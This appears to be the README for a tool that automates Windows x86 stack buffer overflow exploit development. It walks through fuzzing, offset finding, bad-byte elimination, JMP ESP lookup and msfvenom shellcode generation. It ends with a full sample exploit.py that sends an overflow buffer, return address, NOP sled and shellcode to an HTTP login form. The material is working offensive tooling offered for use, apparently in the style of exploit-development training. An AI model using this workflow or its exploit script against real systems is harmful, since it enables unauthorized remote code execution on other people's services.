# BufferBurst

A semi-automated tool for developing Windows x86 stack-based buffer overflow exploits. Guides you through each stage of the standard BOF workflow, handles the repetitive socket work, and generates a ready-to-run exploit script.

Designed for use with WinDbg on Windows targets.

---

## Requirements

```
pip install -r requirements.txt
```

Requires `msfvenom` on the attacking machine for payload generation.

---

## Usage

### Socket target
```bash
python BufferBurst.py -i <TARGET_IP> -p <PORT> -t socket [-P <prefix>] [-f <fuzz_step>] [-d windbg] [-v]
```

### HTTP target
```bash
python BufferBurst.py -i <TARGET_IP> -p <PORT> -t http -T <template.txt> [-f <fuzz_step>] [-d windbg] [-v]
```

### Arguments

| Flag | Description |
|------|-------------|
| `-i` | Target IP address |
| `-p` | Target port |
| `-t` | Protocol — `socket` or `http` |
| `-T` | Path to HTTP request template (required for `http`) |
| `-P` | Prefix string prepended to each send (socket mode) |
| `-f` | Bytes to increment per fuzz step (default: 100) |
| `-d` | Debugger — `windbg` (default, only option currently) |
| `-v` | Verbose output |

---

## HTTP Template Format

Create a plain text file containing the raw HTTP request with `*` as the payload placeholder:

```
POST /login HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

username=*&password=A
```

- `Content-Length` is recalculated automatically on every send
- The `*` in `Accept: */*` is never touched — substitution targets the body first, then the request line (GET)
- Line endings are normalised to CRLF automatically
- The `Host` header is checked against `-i`/`-p` at startup and warns on mismatch

---

## Workflow

BufferBurst walks through six stages. At every prompt that follows a crash, type `r` to resend the payload (replay) without restarting the tool.

### Stage 1 — Fuzz
Sends cyclic patterns of increasing size until the service crashes. Automatically detects when the service is back up before proceeding.

### Stage 2 — Find Offset
Sends a De Bruijn cyclic pattern (no `msf-pattern_create` required). After the crash, run `r eip` in WinDbg and paste the value in. The offset is calculated natively.

### Stage 3 — Verify Offset
Sends `A * offset + BBBB`. Instructs you to run `r eip` — EIP should read `42424242`. Confirms the offset is correct before proceeding.

### Stage 4 — Bad Bytes
Sends all 255 bytes after the overflow. Displays a colour-coded hex grid (green = testing, red = confirmed bad, dim = removed). Enter bad bytes one round at a time until the dump is clean.

**Common HTTP bad bytes:** `0a 0d 25 26 2b 3d` (`\n`, `\r`, `%`, `&`, `+`, `=`)

### Stage 5 — Find JMP ESP
Shows WinDbg commands to find a `JMP ESP` instruction in a module without ASLR/SafeSEH. Instructs you to set a breakpoint (`bp <addr>`) before the verification send so EIP can be confirmed at the breakpoint, not after the jump.

### Stage 6 — Generate Payload
Runs `msfvenom` with your bad bytes excluded and writes `exploit.py` to the project root.

**Exploit buffer structure:**
```
A * offset  |  JMP ESP (4 bytes)  |  \x43 * 4  |  \x90 * 16  |  shellcode
```
The 4-byte `\x43` padding and 16-byte NOP sled give the shikata_ga_nai decoder room to run its GetPC routine without corrupting itself.

---

## Session Persistence

Progress is saved to `sessions/<ip>_<port>.json` after each stage. If the tool is interrupted, re-run with the same arguments and choose **Resume** to pick up where you left off.

After `exploit.py` is generated the session is marked `done`. Re-running the tool against the same target offers to skip straight to Stage 6 to regenerate the payload with a different LHOST/LPORT — no need to repeat the earlier stages.

To start completely fresh, choose **No** at the resume prompt.

---

## Output

A self-contained `exploit.py` is written to the project root. For HTTP targets it looks like:

```python
import socket

ip   = "192.168.1.100"
port = 80

overflow = b"A" * 780
retn     = b"\x83\x0c\x09\x10"
padding  = b"\x43" * 4
nops     = b"\x90" * 16
payload  = b""
payload += b"\xb8..."   # msfvenom output

content = b'username=' + overflow + retn + padding + nops + payload + b'&password=A'

request  = b'POST /login HTTP/1.1\r\n'
request += b'Host: 192.168.1.100\r\n'
# ... remaining headers ...
request += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
request += b"\r\n"
request += content

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("Sending exploit...")
    s.send(request)
    s.close()
    print("Done!")
except Exception as e:
    print(f"Could not connect: {e}")
```

---

## Supported Debuggers

| Debugger | Flag |
|----------|------|
| WinDbg   | `windbg` (default) |

Additional debugger profiles can be added in `Templates/Debuggers.py`.
